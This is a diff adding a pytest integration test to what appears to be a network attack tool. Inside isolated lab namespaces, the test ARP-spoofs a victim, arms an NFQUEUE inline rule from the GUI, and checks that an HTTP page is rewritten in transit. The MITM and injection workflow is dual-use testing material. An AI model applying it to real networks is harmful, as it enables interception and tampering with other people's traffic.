@@ -774,3 +774,70 @@ def test_ipv6_length_changing_edit_stays_in_sync():
                 bridge.stop()
             if server is not None:
                 server.terminate(); server.wait(timeout=3)
+
+
+def test_gui_start_inline_rewrites_victim_traffic():
+    """Drive the real GUI wiring: a rule added to the rules panel + MainWindow.
+    _start_inline installs the nft queue and runs the NFQUEUE, and the MITM'd
+    victim receives content the GUI rewrote in flight."""
+    import tempfile
+
+    pytest.importorskip("netfilterqueue")
+    from PySide6.QtWidgets import QApplication
+
+    from reforge.attacks.arp_mitm import ArpMitm
+
+    app = QApplication.instance() or QApplication([])
+    assert app is not None
+
+    docroot = tempfile.mkdtemp(prefix="rf-gui-")
+    with open(os.path.join(docroot, "page.html"), "w") as fh:
+        fh.write("BANNER=ORIGINAL-TOKEN\n")     # same length as the replacement
+
+    server = mitm = win = None
+    with SegmentLab() as net:
+        try:
+            server = subprocess.Popen(
+                ["ip", "netns", "exec", "rf-gw", "python3", "-m", "http.server",
+                 "8000", "--bind", net["gateway_ip4"]],
+                cwd=docroot, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(1.0)
+
+            atk_mac = _attacker_mac()
+            mitm = ArpMitm(ATTACKER_IFACE, [net["victim_ip4"]],
+                           gateway=net["gateway_ip4"], interval=1.0)
+            assert mitm.start(), mitm.warnings
+            netns_exec("rf-victim", "ping", "-c", "1", "-W", "1", net["gateway_ip4"],
+                       check=False)
+            assert _wait_flip(net["gateway_ip4"], atk_mac), "victim never routed through us"
+
+            # the operator adds a rewrite rule in the Rules panel, then arms inline
+            from reforge.gui.main_window import MainWindow
+            win = MainWindow()
+            win.rules_panel.specs.append({
+                "name": "inject", "enabled": True, "match": {"type": "all"},
+                "actions": [{"type": "payload_replace",
+                             "find": "ORIGINAL-TOKEN", "replace": "INJECTED-TOKEN"}],
+            })
+            status = win._start_inline(ATTACKER_IFACE, [net["victim_ip4"]])
+            assert "inline" in status.lower()
+            assert win._nfq_runner is not None
+            time.sleep(0.6)
+
+            got = ""
+            for _ in range(4):
+                r = netns_exec("rf-victim", "curl", "-s", "-m", "5",
+                               f"http://{net['gateway_ip4']}:8000/page.html", check=False)
+                got = r.stdout
+                if "INJECTED-TOKEN" in got:
+                    break
+                time.sleep(0.3)
+            assert "INJECTED-TOKEN" in got, f"GUI inline path did not rewrite: {got!r}"
+            assert win._nfq_runner.stats.modified >= 1
+        finally:
+            if win is not None:
+                win._stop_inline()          # tears down the nft rules + runner
+            if mitm is not None:
+                mitm.stop()
+            if server is not None:
+                server.terminate(); server.wait(timeout=3)
